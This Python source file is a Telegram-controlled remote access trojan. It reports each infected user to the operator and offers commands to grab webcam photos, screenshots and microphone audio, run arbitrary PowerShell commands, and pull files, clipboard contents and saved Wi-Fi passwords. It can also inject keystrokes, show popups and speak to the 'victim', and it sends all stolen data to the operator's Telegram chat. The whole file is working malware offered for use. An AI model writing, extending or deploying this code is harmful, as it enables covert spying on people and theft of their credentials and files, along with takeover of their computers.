from distutils.command.config import config
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
import json
import flag
import pyperclip
import subprocess
import sys
import getpass
from Modules import (
    ip_info,
    webcam_snap,
    screen_shot,
    audio_recorder,
    text_speaker,
    system_info,
    move_mouse,
    get_wifi_password,
    chat,
    show_popup,
    send_key_press,
    wifi_scanner,
    open_website,
)


config_file = json.load(open("config.json"))
api_key = config_file["apiKey"]
chat_id = config_file["chatID"]

username = getpass.getuser()
telegram_parsing_mode = ParseMode.HTML

updater = Updater(api_key, use_context=True)
dispatcher = updater.dispatcher
dispatcher.bot.send_message(chat_id=chat_id, text="☠️ " + username + " Connected")


def listToString(s):
    str1 = " "
    return str1.join(s)


def main_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("📟 Get IP", callback_data="Get_IP")],
        [InlineKeyboardButton("📸 Get Screenshot", callback_data="get_Screenshot")],
        [InlineKeyboardButton("📷 Get Pic From Webcam", callback_data="get_Webcam")],
        [InlineKeyboardButton("👂 Eavesdrop", callback_data="eavesdrop")],
        [InlineKeyboardButton("🗣️ Text To Speech on victim", callback_data="speak")],
        [InlineKeyboardButton("💬 Send Message To Client", callback_data="sendMessage")],
        [
            InlineKeyboardButton(
                "🖥️ Get System Information", callback_data="get_system_info"
            )
        ],
        [
            InlineKeyboardButton(
                "🔑 Perform Shell Commands", callback_data="shell_commands"
            )
        ],
        [InlineKeyboardButton("🗊 Get Specific File", callback_data="get_file")],
        [InlineKeyboardButton("🌐 Open Website", callback_data="open_website")],
        [
            InlineKeyboardButton(
                "🖲️ Move mouse randomly and Slowly", callback_data="move_mouse"
            )
        ],
        [InlineKeyboardButton("⌨️ Type String", callback_data="type_stringKey")],
        [
            InlineKeyboardButton(
                "⚠️ Show Alert Box with given message", callback_data="show_popup"
            )
        ],
        [InlineKeyboardButton("📋 Get Clipboard", callback_data="get_clipboard")],
        [
            InlineKeyboardButton(
                "🗝️ Get Wifi Password", callback_data="get_wifi_password"
            )
        ],
        [
            InlineKeyboardButton(
                "📶 Get Wi-Fi Access Points", callback_data="get_wifi_accesspoints"
            )
        ],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    update.message.reply_text("Available Commands :", reply_markup=reply_markup)


def speak(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    text_speaker.text_speaker(Crt_values)


def chat_message(update, context):
    inputs = (update.message.text).split()
    Crt_values = inputs[1:]
    client_message = chat.chat(listToString(Crt_values))
    if client_message:
        update.message.reply_text(f"Message from {username} : {client_message}")


def showPopup(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])

    show_popup.show_popup(Crt_values)


def type_string(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    send_key_press.send_key_press(Crt_values)


def shell_commands(update, context):
    inputs = (update.message.text).split()
    command = listToString(inputs[1:])
    cmd_output = subprocess.Popen(
        f"powershell.exe {command}", shell=True, stdout=subprocess.PIPE
    )
    dispatcher.bot.send_message(
        chat_id=chat_id, text=cmd_output.stdout.read().decode(sys.stdout.encoding)
    )


def open_websites(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    open_website.open_website(Crt_values)


def get_file(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    context.bot.send_document(chat_id=chat_id, document=open(Crt_values, "rb"))


def button(update, context):
    query = update.callback_query
    query.answer()
    result = query.data

    if result == "get_Webcam":
        webcam_snap.webcam_snap()
        dispatcher.bot.send_document(
            chat_id=chat_id,
            caption=username + "'s Webcam Snap",
            document=open("webcam.jpg", "rb"),
        )
        os.remove("webcam.jpg")

    elif result == "get_system_info":
        sys_info = system_info.system_info()
        context.bot.send_message(
            chat_id=chat_id,
            text=f"<b>-------🧰 Hardware Info-----</b>\n\n"
            f"📍 System --> {sys_info.get_system()}\n"
            f"📍 Name --> {sys_info.get_system_name()}\n"
            f"📍 Release --> {sys_info.get_system_release()}\n"
            f"📍 Version --> {sys_info.get_system_version()}\n"
            f"📍 Machine --> {sys_info.get_system_machine()}\n"
            f"📍 Processor --> {sys_info.get_system_processor()}\n\n"
            f"<b>-------📁 Memory Info-----</b>\n\n"
            f"📍 Memory Total --> {round(sys_info.mem_total)} GB\n"
            f"📍 Free Memory --> {round(sys_info.mem_free)} GB\n"
            f"📍 Used Memory --> {round(sys_info.mem_used)} GB\n\n"
            f"-------<b>💿 Hard Disk Info-----</b>\n\n"
            f"📍 Total HDD --> {round(sys_info.HDD_total)} GB\n"
            f"📍 Used HDD --> {round(sys_info.HDD_Used)} GB\n"
            f"📍 Free HDD --> {round(sys_info.HDD_Free)} GB\n",
            parse_mode=telegram_parsing_mode,
        )
    elif result == "Get_IP":
        ip_address_info = ip_info.ip_info()
        context.bot.send_message(
            chat_id=chat_id,
            text="⭕ <b>IP Address :</b> "
            + ip_address_info["query"]
            + "\n⭕ <b>Country :</b> "
            + ip_address_info["country"]
            + " "
            + flag.flag(ip_address_info["countryCode"])
            + "\n⭕ <b> Region : </b>"
            + ip_address_info["regionName"]
            + "\n⭕ <b>City : </b>"
            + ip_address_info["city"],
            parse_mode=telegram_parsing_mode,
        )
    elif result == "get_Screenshot":
        screen_shot.screen_shot()
        dispatcher.bot.send_photo(
            chat_id=chat_id,
            caption=username + "'s Screenshot",
            photo=open("Screenshot.png", "rb"),
        )
        os.remove("Screenshot.png")

    elif result == "eavesdrop":
        audio_recorder.audio_recorder()
        dispatcher.bot.send_audio(
            chat_id=chat_id,
            caption=username + "'s Audio",
            audio=open("audio_record.wav", "rb"),
        )
        os.remove("audio_record.wav")

    elif result == "sendMessage":
        context.bot.send_message(
            chat_id=chat_id,
            text="To send message to victim, use /send_message <message>",
        )

    elif result == "shell_commands":
        context.bot.send_message(
            chat_id=chat_id,
            text="To perform shell commands, use /shell <command>",
        )

    elif result == "open_website":
        context.bot.send_message(
            chat_id=chat_id,
            text="To open website, use /open_website <website>",
        )

    elif result == "move_mouse":
        context.bot.send_message(
            chat_id=chat_id,
            text="Moving mouse randomly......",
        )
        move_mouse.move_mouse()
        context.bot.send_message(chat_id=chat_id, text="✅️ Done!")

    elif result == "send_keypress":
        context.bot.send_message(
            chat_id=chat_id,
            text="To send keypress, use /type_string <string>",
        )

    elif result == "show_popup":
        context.bot.send_message(
            chat_id=chat_id,
            text="To show alert box, use /show_popup <message>",
        )

    elif result == "get_clipboard":
        context.bot.send_message(
            chat_id=chat_id, text=f"📋 Clipboard : \n {pyperclip.paste()}"
        )

    elif result == "get_wifi_password":
        wifi_pass = " \n".join(get_wifi_password.get_wifi_password())
        context.bot.send_message(
            chat_id=chat_id,
            text=wifi_pass,
        )

    elif result == "type_stringKey":
        context.bot.send_message(
            chat_id=chat_id,
            text="To type string key, use /type_string <string>",
        )

    elif result == "get_wifi_accesspoints":
        access_points = wifi_scanner.wifi_scanner()
        context.bot.send_message(
            chat_id=chat_id,
            text=f"<b>📡 Access Points from {username}:</b> \n {access_points}",
            parse_mode=telegram_parsing_mode,
        )

    elif result == "speak":
        context.bot.send_message(
            chat_id=chat_id,
            text="To speak, use /speak <text>",
        )

    elif result == "get_file":
        context.bot.send_message(
            chat_id=chat_id,
            text="To send file, use /get_file <file path>",
        )


# Telegram Keyboard buttons
updater.dispatcher.add_handler(CommandHandler("start", main_menu))

# Telegram Commands
updater.dispatcher.add_handler(CommandHandler("send_message", chat_message))
updater.dispatcher.add_handler(CommandHandler("speak", speak))
updater.dispatcher.add_handler(CommandHandler("show_popup", showPopup))
updater.dispatcher.add_handler(CommandHandler("type_string", type_string))
updater.dispatcher.add_handler(CommandHandler("shell", shell_commands))
updater.dispatcher.add_handler(CommandHandler("open_website", open_websites))
updater.dispatcher.add_handler(CommandHandler("get_file", get_file))

# Telegram Keyboard buttons callbacks
updater.dispatcher.add_handler(CallbackQueryHandler(button))


updater.start_polling()
updater.idle()
